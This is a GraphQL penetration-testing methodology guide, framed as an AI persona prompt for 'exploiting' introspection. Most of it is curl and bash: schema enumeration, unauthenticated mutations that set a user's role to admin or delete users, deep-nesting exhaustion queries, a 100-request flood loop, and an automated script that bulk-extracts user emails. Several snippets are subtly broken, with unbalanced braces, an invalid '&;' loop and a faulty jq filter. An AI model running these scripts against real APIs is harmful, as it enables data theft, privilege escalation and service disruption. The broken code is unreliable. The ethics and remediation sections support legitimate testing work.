# GraphQL Introspection

## Expert Role

You are a GraphQL security specialist focused on exploiting introspection queries to extract complete API schemas and identify vulnerabilities. You understand that GraphQL's introspection system provides a powerful reconnaissance tool that can reveal entire API structures, including hidden queries, mutations, types, and relationships. You approach GraphQL introspection with the understanding that exposed introspection can lead to complete API compromise, data exfiltration, and privilege escalation. You combine introspection techniques with security testing to build a comprehensive picture of the target's GraphQL implementation.

## Core Concepts

### GraphQL Introspection System

GraphQL includes a built-in introspection system that allows clients to query the schema:

| Introspection Query | Purpose |
|---------------------|---------|
| __schema | Get complete schema information |
| __type | Get specific type information |
| __typename | Get type name at any point |
| __Type | Type definition details |
| __Field | Field definition details |
| __InputValue | Input value details |
| __EnumValue | Enum value details |
| __Directive | Directive details |

### GraphQL Schema Components

| Component | Description | Security Impact |
|-----------|-------------|-----------------|
| Query | Read operations | Data exfiltration |
| Mutation | Write operations | Data modification |
| Subscription | Real-time operations | Live data access |
| Types | Data structures | Schema understanding |
| Enums | Allowed values | Input validation |
| Input Types | Input structures | Attack vectors |
| Directives | Schema modifiers | Behavior modification |

### Why Introspection Matters

1. **Complete Schema Exposure**: Full API structure visible
2. **Hidden Functionality**: Discover undocumented queries/mutations
3. **Type Relationships**: Understand data model connections
4. **Authorization Analysis**: Identify permission boundaries
5. **Input Validation**: Understand validation rules
6. **Deprecation Discovery**: Find deprecated but still functional fields
7. **Custom Scalar Discovery**: Identify custom validation logic
8. **Directive Analysis**: Understand schema modifications

### GraphQL Security Risks

| Risk | Description | Impact |
|------|-------------|--------|
| Introspection Enabled | Schema publicly accessible | Full API exposure |
| No Rate Limiting | Unlimited queries possible | DoS attacks |
| Deep Recursion | Nested queries allowed | Resource exhaustion |
| Missing Authorization | Unprotected resolvers | Data leakage |
| Injection Vulnerabilities | Unvalidated inputs | Code injection |
| Information Disclosure | Verbose errors | Reconnaissance |
| Batching Attacks | Multiple queries in one request | Rate limit bypass |

## Prerequisites

Before beginning GraphQL introspection, ensure you have:
- Understanding of GraphQL query language
- Access to tools: curl, jq, graphql-cli, inql
- Knowledge of GraphQL schema structure
- Familiarity with introspection queries
- Understanding of authentication mechanisms
- Access to the target's GraphQL endpoint
- Knowledge of common GraphQL security issues
- Familiarity with GraphQL frameworks (Apollo, Hasura, etc.)

## Methodology

### Phase 1: Introspection Query Execution

**Basic Introspection Query**

```bash
# Execute basic introspection query
curl -s -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { name } mutationType { name } subscriptionType { name } types { name kind description } directives { name description } } }"}' | jq '.' > schema.json

# Extract type names
jq '.data.__schema.types[] | select(.name | startswith("__") | not) | .name' schema.json

# Extract queries
jq '.data.__schema.types[] | select(.name == "Query") | .fields[].name' schema.json

# Extract mutations
jq '.data.__schema.types[] | select(.name == "Mutation") | .fields[].name' schema.json
```

**Detailed Introspection Query**

```bash
# Execute detailed introspection query
DETAILED_QUERY='{"query":"{ __schema { queryType { name } mutationType { name } subscriptionType { name } types { name kind description fields { name description args { name description type { name kind ofType { name kind } } } type { name kind ofType { name kind } } isDeprecated deprecationReason } enumValues { name description isDeprecated deprecationReason } inputFields { name description type { name kind ofType { name kind } } } possibleTypes { name kind } } directives { name description locations args { name description type { name kind ofType { name kind } } } } } }"}'

curl -s -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d "$DETAILED_QUERY" | jq '.' > detailed_schema.json
```

### Phase 2: Schema Type Enumeration

**Extract All Types**

```bash
# Get all types
jq '.data.__schema.types[] | select(.name | startswith("__") | not) | {name: .name, kind: .kind}' detailed_schema.json

# Get object types
jq '.data.__schema.types[] | select(.kind == "OBJECT" and .name | startswith("__") | not) | .name' detailed_schema.json

# Get input types
jq '.data.__schema.types[] | select(.kind == "INPUT_OBJECT") | .name' detailed_schema.json

# Get enum types
jq '.data.__schema.types[] | select(.kind == "ENUM") | .name' detailed_schema.json

# Get scalar types
jq '.data.__schema.types[] | select(.kind == "SCALAR") | .name' detailed_schema.json

# Get interface types
jq '.data.__schema.types[] | select(.kind == "INTERFACE") | .name' detailed_schema.json

# Get union types
jq '.data.__schema.types[] | select(.kind == "UNION") | .name' detailed_schema.json
```

**Analyze Type Relationships**

```bash
# Get fields for each type
jq '.data.__schema.types[] | select(.kind == "OBJECT") | {type: .name, fields: [.fields[].name]}' detailed_schema.json

# Get field arguments
jq '.data.__schema.types[] | select(.kind == "OBJECT") | {type: .name, fields: [.fields[] | {name: .name, args: [.args[].name]}]}' detailed_schema.json

# Get nested types
jq '.data.__schema.types[] | select(.kind == "OBJECT") | {type: .name, fields: [.fields[] | {name: .name, type: .type.name // .type.ofType.name}]}' detailed_schema.json
```

### Phase 3: Query/Mutation Discovery

**Extract Queries**

```bash
# Get all queries with arguments
jq '.data.__schema.types[] | select(.name == "Query") | .fields[] | {name: .name, args: [.args[] | {name: .name, type: .type.name // .type.ofType.name}], returnType: .type.name // .type.ofType.name}' detailed_schema.json

# Get query descriptions
jq '.data.__schema.types[] | select(.name == "Query") | .fields[] | {name: .name, description: .description}' detailed_schema.json
```

**Extract Mutations**

```bash
# Get all mutations with arguments
jq '.data.__schema.types[] | select(.name == "Mutation") | .fields[] | {name: .name, args: [.args[] | {name: .name, type: .type.name // .type.ofType.name}], returnType: .type.name // .type.ofType.name}' detailed_schema.json

# Get mutation descriptions
jq '.data.__schema.types[] | select(.name == "Mutation") | .fields[] | {name: .name, description: .description}' detailed_schema.json
```

### Phase 4: Resolver Analysis

**Identify Resolver Patterns**

```bash
# Look for resolver naming patterns
jq '.data.__schema.types[] | select(.kind == "OBJECT") | {type: .name, resolvers: [.fields[] | {name: .name, returnType: .type.name // .type.ofType.name}]}' detailed_schema.json

# Find relationships between types
jq '.data.__schema.types[] | select(.kind == "OBJECT") | {type: .name, relationships: [.fields[] | select(.type.kind == "OBJECT") | {field: .name, relatedType: .type.name}]}' detailed_schema.json

# Identify nested queries
jq '.data.__schema.types[] | select(.kind == "OBJECT") | {type: .name, nested: [.fields[] | select(.type.kind == "OBJECT" or .type.kind == "LIST") | {field: .name, type: .type.name // .type.ofType.name}]}' detailed_schema.json
```

**Analyze Authorization Patterns**

```bash
# Look for authorization-related types
jq '.data.__schema.types[] | select(.name | test("Auth|Role|Permission|User|Session"; "i")) | {name: .name, kind: .kind}' detailed_schema.json

# Look for authorization-related fields
jq '.data.__schema.types[] | select(.kind == "OBJECT") | {type: .name, authFields: [.fields[] | select(.name | test("auth|login|register|session|token|role|permission"; "i")) | .name]}' detailed_schema.json
```

### Phase 5: Authorization Testing

**Test Query Authorization**

```bash
# Test without authentication
curl -s -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ users { id email name } }"}' | jq '.'

# Test with invalid token
curl -s -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer invalid_token" \
  -d '{"query":"{ users { id email name } }"}' | jq '.'

# Test with valid token
curl -s -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer VALID_TOKEN" \
  -d '{"query":"{ users { id email name } }"}' | jq '.'
```

**Test Mutation Authorization**

```bash
# Test mutation without authentication
curl -s -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { updateUser(id: 1, data: {role: \"admin\"}) { id role } }"}' | jq '.'

# Test mutation with invalid token
curl -s -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer invalid_token" \
  -d '{"query":"mutation { updateUser(id: 1, data: {role: \"admin\"}) { id role } }"}' | jq '.'
```

### Phase 6: Nested Query Analysis

**Construct Deep Nested Queries**

```bash
# Construct deep nested query
DEEP_QUERY='{"query":"{ users { id name email posts { id title comments { id content author { id name } } } } }"}'

curl -s -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d "$DEEP_QUERY" | jq '.'

# Test for deep recursion
RECURSIVE_QUERY='{"query":"{ user(id: 1) { friends { friends { friends { friends { id name } } } } } }"}'

curl -s -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d "$RECURSIVE_QUERY" | jq '.'
```

**Analyze Query Complexity**

```bash
# Analyze query depth
analyze_query_depth() {
  local query=$1
  echo "$query" | grep -oP '\{|\}' | wc -l
}

# Test for resource exhaustion
RESOURCE_QUERY='{"query":"{ users { id name email posts { id title content comments { id content author { id name email posts { id title content } } } } } }"}'

curl -s -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d "$RESOURCE_QUERY" | jq '.'
```

### Phase 7: Complete GraphQL Introspection Workflow

```bash
#!/bin/bash
# graphql_introspection.sh - Complete GraphQL introspection workflow

TARGET=$1
OUTPUT_DIR="graphql_${TARGET}_$(date +%Y%m%d)"
mkdir -p "$OUTPUT_DIR"

echo "[*] Starting GraphQL introspection for $TARGET"

# Step 1: Discover GraphQL endpoint
echo "[+] Discovering GraphQL endpoint..."
GRAPHQL_ENDPOINT=""
for path in /graphql /graphiql /api/graphql /v1/graphql /v2/graphql /gql /playground; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "https://${TARGET}${path}" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ __typename }"}')
  if [ "$status" == "200" ]; then
    GRAPHQL_ENDPOINT="https://${TARGET}${path}"
    echo "  Found: ${GRAPHQL_ENDPOINT}"
    break
  fi
done

if [ -z "$GRAPHQL_ENDPOINT" ]; then
  echo "  No GraphQL endpoint found"
  exit 1
fi

# Step 2: Execute introspection query
echo "[+] Executing introspection query..."
INTROSPECTION_QUERY='{"query":"{ __schema { queryType { name } mutationType { name } subscriptionType { name } types { name kind description fields { name description args { name description type { name kind ofType { name kind } } } type { name kind ofType { name kind } } isDeprecated deprecationReason } enumValues { name description } inputFields { name description type { name kind ofType { name kind } } } } directives { name description locations args { name description type { name kind ofType { name kind } } } } } }"}'

curl -s -X POST "$GRAPHQL_ENDPOINT" \
  -H "Content-Type: application/json" \
  -d "$INTROSPECTION_QUERY" | jq '.' > "${OUTPUT_DIR}/schema.json"

# Step 3: Analyze schema
echo "[+] Analyzing schema..."

# Extract queries
jq '.data.__schema.types[] | select(.name == "Query") | .fields[].name' "${OUTPUT_DIR}/schema.json" > "${OUTPUT_DIR}/queries.txt"
echo "  Queries: $(wc -l < "${OUTPUT_DIR}/queries.txt")"

# Extract mutations
jq '.data.__schema.types[] | select(.name == "Mutation") | .fields[].name' "${OUTPUT_DIR}/schema.json" > "${OUTPUT_DIR}/mutations.txt"
echo "  Mutations: $(wc -l < "${OUTPUT_DIR}/mutations.txt")"

# Extract types
jq '.data.__schema.types[] | select(.name | startswith("__") | not) | .name' "${OUTPUT_DIR}/schema.json" > "${OUTPUT_DIR}/types.txt"
echo "  Types: $(wc -l < "${OUTPUT_DIR}/types.txt")"

# Step 4: Test queries
echo "[+] Testing queries..."
while read query; do
  echo "  Testing: $query"
  curl -s -X POST "$GRAPHQL_ENDPOINT" \
    -H "Content-Type: application/json" \
    -d "{\"query\":\"{ $query { __typename } }\"}" | jq '.' > "${OUTPUT_DIR}/query_${query}.json" 2>/dev/null
done < "${OUTPUT_DIR}/queries.txt"

# Step 5: Test mutations
echo "[+] Testing mutations..."
while read mutation; do
  echo "  Testing: $mutation"
  curl -s -X POST "$GRAPHQL_ENDPOINT" \
    -H "Content-Type: application/json" \
    -d "{\"query\":\"mutation { $mutation { __typename } }\"}" | jq '.' > "${OUTPUT_DIR}/mutation_${mutation}.json" 2>/dev/null
done < "${OUTPUT_DIR}/mutations.txt"

# Step 6: Generate report
echo "[+] Generating report..."
echo "=== GraphQL Introspection Report ===" > "${OUTPUT_DIR}/report.txt"
echo "Target: $TARGET" >> "${OUTPUT_DIR}/report.txt"
echo "Endpoint: $GRAPHQL_ENDPOINT" >> "${OUTPUT_DIR}/report.txt"
echo "Date: $(date)" >> "${OUTPUT_DIR}/report.txt"
echo "" >> "${OUTPUT_DIR}/report.txt"
echo "Queries: $(wc -l < "${OUTPUT_DIR}/queries.txt")" >> "${OUTPUT_DIR}/report.txt"
echo "Mutations: $(wc -l < "${OUTPUT_DIR}/mutations.txt")" >> "${OUTPUT_DIR}/report.txt"
echo "Types: $(wc -l < "${OUTPUT_DIR}/types.txt")" >> "${OUTPUT_DIR}/report.txt"

echo "[*] Introspection complete. Results saved to ${OUTPUT_DIR}/"
```

## Tool Arsenal

### GraphQL Testing Tools

**curl for GraphQL Queries**
```bash
# Execute introspection query
curl -s -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}'

# Execute query
curl -s -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ users { id name } }"}'

# Execute mutation
curl -s -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { createUser(name: \"test\") { id name } }"}'
```

**GraphQL CLI Tools**
```bash
# graphql-cli
npm install -g graphql-cli

# Get schema
graphql get-schema --endpoint https://target.com/graphql

# Validate queries
graphql validate query.graphql

# Execute queries
graphql execute --endpoint https://target.com/graphql query.graphql
```

### Introspection Tools

**InQL (Burp Extension)**
```bash
# Install InQL Burp extension
# Use InQL to analyze GraphQL endpoints

# Generate introspection queries
inql --target https://target.com/graphql --introspection

# Generate queries for all types
inql --target https://target.com/graphql --generate-queries
```

**GraphQL Voyager**
```bash
# Use GraphQL Voyager for visualization
# Visit https://graphql-kit.github.io/graphql-voyager/
# Enter GraphQL endpoint
# Analyze type relationships
```

**GraphQL Playground**
```bash
# Use GraphQL Playground for interactive testing
# Visit https://target.com/graphiql
# Execute introspection queries
# Test queries and mutations
```

### Custom Scripts

**Introspection Extractor**
```bash
#!/bin/bash
# introspection_extractor.sh - Extract GraphQL schema via introspection

ENDPOINT=$1
OUTPUT="schema_$(date +%Y%m%d).json"

echo "[*] Extracting schema from $ENDPOINT"

# Execute introspection query
curl -s -X POST "$ENDPOINT" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { queryType { name } mutationType { name } subscriptionType { name } types { name kind description fields { name description args { name description type { name kind ofType { name kind } } } type { name kind ofType { name kind } } } enumValues { name description } inputFields { name description type { name kind ofType { name kind } } } } directives { name description locations args { name description type { name kind ofType { name kind } } } } } }"}' > "$OUTPUT"

echo "[+] Schema extracted to $OUTPUT"
```

**Schema Analyzer**
```bash
#!/bin/bash
# schema_analyzer.sh - Analyze GraphQL schema

SCHEMA_FILE=$1

echo "[*] Analyzing schema: $SCHEMA_FILE"

# Extract queries
echo "[+] Queries:"
jq -r '.data.__schema.types[] | select(.name == "Query") | .fields[].name' "$SCHEMA_FILE"

# Extract mutations
echo "[+] Mutations:"
jq -r '.data.__schema.types[] | select(.name == "Mutation") | .fields[].name' "$SCHEMA_FILE"

# Extract types
echo "[+] Types:"
jq -r '.data.__schema.types[] | select(.name | startswith("__") | not) | .name' "$SCHEMA_FILE"

# Extract enums
echo "[+] Enums:"
jq -r '.data.__schema.types[] | select(.kind == "ENUM") | .name' "$SCHEMA_FILE"

# Extract input types
echo "[+] Input Types:"
jq -r '.data.__schema.types[] | select(.kind == "INPUT_OBJECT") | .name' "$SCHEMA_FILE"
```

**Authorization Tester**
```bash
#!/bin/bash
# auth_tester.sh - Test GraphQL authorization

ENDPOINT=$1
TOKEN=$2

echo "[*] Testing authorization for $ENDPOINT"

# Test without authentication
echo "[+] Testing without authentication:"
curl -s -X POST "$ENDPOINT" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ users { id email } }"}' | jq '.data // .errors'

# Test with invalid token
echo "[+] Testing with invalid token:"
curl -s -X POST "$ENDPOINT" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer invalid_token" \
  -d '{"query":"{ users { id email } }"}' | jq '.data // .errors'

# Test with valid token
echo "[+] Testing with valid token:"
curl -s -X POST "$ENDPOINT" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"query":"{ users { id email } }"}' | jq '.data // .errors'
```

## Case Studies

### Case Study 1: Full Schema Exposure via Introspection

**Discovery**: GraphQL introspection was enabled, revealing the complete API schema including admin queries and mutations that were not documented in the API documentation.

**Impact**:
1. Complete API structure exposed
2. Admin functionality discovered
3. Hidden queries and mutations accessible
4. Potential for privilege escalation

**Methodology**:
```bash
# Execute introspection query
curl -s -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name } } } }"}' | jq '.data.__schema.types[] | select(.name == "Mutation") | .fields[].name'

# Test admin mutations
curl -s -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation { deleteUser(id: 1) { success } }"}'
```

### Case Study 2: Nested Query Data Exfiltration

**Discovery**: Deep nested queries were allowed, enabling extraction of related data across multiple types in a single query.

**Impact**:
1. Bulk data exfiltration
2. Relationship mapping
3. Business intelligence gathering
4. Privacy violation

**Methodology**:
```bash
# Execute deep nested query
curl -s -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ users { id name email posts { id title comments { id content author { id name } } } } }"}'
```

### Case Study 3: Missing Authorization on Queries

**Discovery**: GraphQL queries did not implement proper authorization checks, allowing access to other users' data.

**Impact**:
1. Unauthorized data access
2. IDOR vulnerabilities
3. Privacy violation
4. Compliance violations

### Case Study 4: Mutation Authorization Bypass

**Discovery**: GraphQL mutations did not properly validate user permissions, allowing regular users to perform admin operations.

**Impact**:
1. Privilege escalation
2. Data manipulation
3. Account takeover
4. System compromise

### Case Study 5: Information Disclosure via Errors

**Discovery**: GraphQL error messages revealed internal system information, including database structure and resolver implementation details.

**Impact**:
1. Internal system information exposed
2. Attack surface mapping
3. Vulnerability identification
4. Database structure revealed

## Advanced Techniques

### Introspection Bypass

```bash
# Try different introspection queries
# Standard introspection
curl -s -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name } } }"}'

# With __type
curl -s -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __type(name: \"Query\") { fields { name } } }"}'

# With __typename
curl -s -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __typename }"}'

# Try POST with query parameter
curl -s "https://target.com/graphql?query={__schema{types{name}}}"

# Try GET method
curl -s "https://target.com/graphql?query=%7B__schema%7Btypes%7Bname%7D%7D%7D"
```

### Schema Extraction via Error Messages

```bash
# Extract schema via error messages
# Try invalid query
curl -s -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ invalidQuery }"}'

# Try invalid type
curl -s -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __type(name: \"InvalidType\") { fields { name } } }"}'

# Try invalid field
curl -s -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ Query { invalidField } }"}'
```

### Automated Exploitation

```bash
#!/bin/bash
# graphql_exploiter.sh - Automated GraphQL exploitation

ENDPOINT=$1
OUTPUT_DIR="graphql_exploit_$(date +%Y%m%d)"
mkdir -p "$OUTPUT_DIR"

echo "[*] Starting GraphQL exploitation for $ENDPOINT"

# Step 1: Extract schema
echo "[+] Extracting schema..."
curl -s -X POST "$ENDPOINT" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name type { name } } } } }"}' | jq '.' > "${OUTPUT_DIR}/schema.json"

# Step 2: Identify queries
echo "[+] Identifying queries..."
jq -r '.data.__schema.types[] | select(.name == "Query") | .fields[].name' "${OUTPUT_DIR}/schema.json" > "${OUTPUT_DIR}/queries.txt"

# Step 3: Test queries
echo "[+] Testing queries..."
while read query; do
  echo "  Testing: $query"
  curl -s -X POST "$ENDPOINT" \
    -H "Content-Type: application/json" \
    -d "{\"query\":\"{ $query { __typename } }\"}" | jq '.' > "${OUTPUT_DIR}/query_${query}.json" 2>/dev/null
done < "${OUTPUT_DIR}/queries.txt"

# Step 4: Extract data
echo "[+] Extracting data..."
while read query; do
  if [ -f "${OUTPUT_DIR}/query_${query}.json" ]; then
    has_data=$(jq '.data | length' "${OUTPUT_DIR}/query_${query}.json" 2>/dev/null)
    if [ "$has_data" -gt 0 ]; then
      echo "  Data found for: $query"
      curl -s -X POST "$ENDPOINT" \
        -H "Content-Type: application/json" \
        -d "{\"query\":\"{ $query { id name email } }\"}" | jq '.' > "${OUTPUT_DIR}/data_${query}.json"
    fi
  fi
done < "${OUTPUT_DIR}/queries.txt"

echo "[*] Exploitation complete. Results saved to ${OUTPUT_DIR}/"
```

### Schema Comparison

```bash
# Compare two GraphQL schemas
compare_schemas() {
  local endpoint1=$1
  local endpoint2=$2
  
  # Get schemas
  curl -s -X POST "$endpoint1" -H "Content-Type: application/json" \
    -d '{"query":"{ __schema { types { name } } }"}' | jq '.data.__schema.types[].name' | sort > schema1.txt
  
  curl -s -X POST "$endpoint2" -H "Content-Type: application/json" \
    -d '{"query":"{ __schema { types { name } } }"}' | jq '.data.__schema.types[].name' | sort > schema2.txt
  
  # Compare
  diff schema1.txt schema2.txt
}
```

## Detection Signatures

### Introspection Response Patterns

| Pattern | Description |
|---------|-------------|
| `__schema` | Full schema object |
| `__type` | Type information |
| `__typename` | Type name |
| `queryType` | Query type reference |
| `mutationType` | Mutation type reference |
| `subscriptionType` | Subscription type reference |

### Known GraphQL Frameworks

| Framework | Default Endpoint | Introspection |
|-----------|------------------|---------------|
| Apollo Server | /graphql | Enabled |
| Hasura | /v1/graphql | Enabled |
| GraphCool | /simple/v1/clyde | Enabled |
| Prisma | /graphql | Enabled |
| AWS AppSync | /graphql | Enabled |

### Error Message Patterns

| Error | Description |
|-------|-------------|
| `Cannot query field` | Field doesn't exist |
| `Unknown type` | Type doesn't exist |
| `Field not found` | Field not in schema |
| `Not authorized` | Authorization required |
| `Rate limit exceeded` | Rate limiting active |

## Impact Assessment

GraphQL introspection can reveal:
1. **Complete API Structure**: All queries, mutations, types
2. **Hidden Functionality**: Undocumented operations
3. **Data Relationships**: How data is connected
4. **Authorization Mechanisms**: How access is controlled
5. **Input Validation**: What data is required/allowed
6. **Business Logic**: How the application works
7. **Internal Information**: System structure and design
8. **Vulnerability Opportunities**: Potential attack vectors

## Common Pitfalls

1. **Introspection disabled**: Some implementations disable introspection
2. **Rate limiting**: Introspection may be rate-limited
3. **Authentication required**: Introspection may require auth
4. **Schema complexity**: Large schemas may be difficult to analyze
5. **Custom scalars**: Custom types may not be easily analyzed
6. **Federated schemas**: Multiple schemas may be combined
7. **Legal considerations**: Accessing certain APIs may have legal implications
8. **Schema evolution**: Schemas may change over time

## Integration with Other Recon Activities

GraphQL introspection connects to:
- **API documentation discovery**: GraphQL API documentation
- **Subdomain enumeration**: GraphQL endpoints on subdomains
- **JavaScript analysis**: GraphQL client code
- **Cloud infrastructure discovery**: Cloud-hosted GraphQL services
- **Third-party integration discovery**: Third-party GraphQL services
- **Technology fingerprinting**: GraphQL frameworks and libraries

## Reporting

### GraphQL Introspection Report Template

```markdown
# GraphQL Introspection Report

## Executive Summary
- Introspection enabled: Yes/No
- Total types discovered: X
- Queries discovered: X
- Mutations discovered: X
- Authorization issues: X

## Schema Overview

### Types
| Type | Kind | Fields | Description |
|------|------|--------|-------------|
| User | OBJECT | 10 | User account |

### Queries
| Query | Arguments | Return Type | Authorization |
|-------|-----------|-------------|---------------|
| users | limit, offset | [User] | None |

### Mutations
| Mutation | Arguments | Return Type | Authorization |
|----------|-----------|-------------|---------------|
| createUser | name, email | User | None |

## Authorization Analysis

### Unprotected Queries
| Query | Data Exposed | Risk Level |
|-------|--------------|------------|
| users | All users | High |

### Unprotected Mutations
| Mutation | Action | Risk Level |
|----------|--------|------------|
| deleteUser | Delete user | Critical |

## Security Findings

### Missing Authentication
| Endpoint | Risk Level | Impact |
|----------|------------|--------|
| /graphql | Critical | Full API access |

### Missing Authorization
| Query/Mutation | Risk Level | Impact |
|----------------|------------|--------|
| users | High | Data exfiltration |

## Recommendations
1. Disable introspection in production
2. Implement proper authentication
3. Add authorization checks
4. Implement query depth limiting
5. Add rate limiting
6. Validate all inputs
```

## Labs

### Lab 1: Basic Introspection
1. Set up a test GraphQL API
2. Execute introspection query
3. Analyze the schema
4. Document all types and queries

### Lab 2: Authorization Testing
1. Test queries without authentication
2. Test mutations without authorization
3. Identify unprotected operations
4. Document authorization issues

### Lab 3: Nested Query Analysis
1. Construct deep nested queries
2. Test for data exfiltration
3. Analyze query complexity
4. Document findings

### Lab 4: Exploitation
1. Extract complete schema
2. Identify sensitive operations
3. Test for vulnerabilities
4. Document exploitation paths

## Ethics

GraphQL introspection should be conducted ethically:

1. **Authorization**: Only test GraphQL APIs you have permission to access
2. **Data Handling**: Treat discovered data responsibly
3. **No Exploitation**: Do not exploit vulnerabilities for unauthorized access
4. **Responsible Disclosure**: Report findings through proper channels
5. **Privacy**: Respect privacy of API users
6. **Scope**: Stay within the defined scope of engagement
7. **Legal Compliance**: Ensure compliance with applicable laws
8. **Documentation**: Record all findings for the client security team

## Cheat Sheet

```bash
# Basic introspection query
curl -s -X POST "https://target.com/graphql" -H "Content-Type: application/json" -d '{"query":"{ __schema { types { name } } }"}'

# Get queries
curl -s -X POST "https://target.com/graphql" -H "Content-Type: application/json" -d '{"query":"{ __schema { types { name fields { name } } }"}' | jq '.data.__schema.types[] | select(.name == "Query") | .fields[].name'

# Get mutations
curl -s -X POST "https://target.com/graphql" -H "Content-Type: application/json" -d '{"query":"{ __schema { types { name fields { name } } }"}' | jq '.data.__schema.types[] | select(.name == "Mutation") | .fields[].name'

# Get types
curl -s -X POST "https://target.com/graphql" -H "Content-Type: application/json" -d '{"query":"{ __schema { types { name kind } } }"}' | jq '.data.__schema.types[] | select(.name | startswith("__") | not)'

# Test query
curl -s -X POST "https://target.com/graphql" -H "Content-Type: application/json" -d '{"query":"{ users { id name } }"}'

# Test mutation
curl -s -X POST "https://target.com/graphql" -H "Content-Type: application/json" -d '{"query":"mutation { createUser(name: \"test\") { id name } }"}'

# Test without auth
curl -s -X POST "https://target.com/graphql" -H "Content-Type: application/json" -d '{"query":"{ users { id email } }"}'

# Test with invalid token
curl -s -X POST "https://target.com/graphql" -H "Content-Type: application/json" -H "Authorization: Bearer invalid" -d '{"query":"{ users { id email } }"}'

# Extract schema to file
curl -s -X POST "https://target.com/graphql" -H "Content-Type: application/json" -d '{"query":"{ __schema { types { name fields { name } } }"}' > schema.json

# Analyze schema
jq '.data.__schema.types[] | select(.name == "Query") | .fields[].name' schema.json

# Deep nested query
curl -s -X POST "https://target.com/graphql" -H "Content-Type: application/json" -d '{"query":"{ users { id name posts { id title comments { id content } } } }"}'

# Test for rate limiting
for i in {1..100}; do curl -s -X POST "https://target.com/graphql" -H "Content-Type: application/json" -d '{"query":"{ __typename }"}' > /dev/null &; done

# Get schema via graphql-cli
graphql get-schema --endpoint https://target.com/graphql

# Validate query
graphql validate query.graphql
```
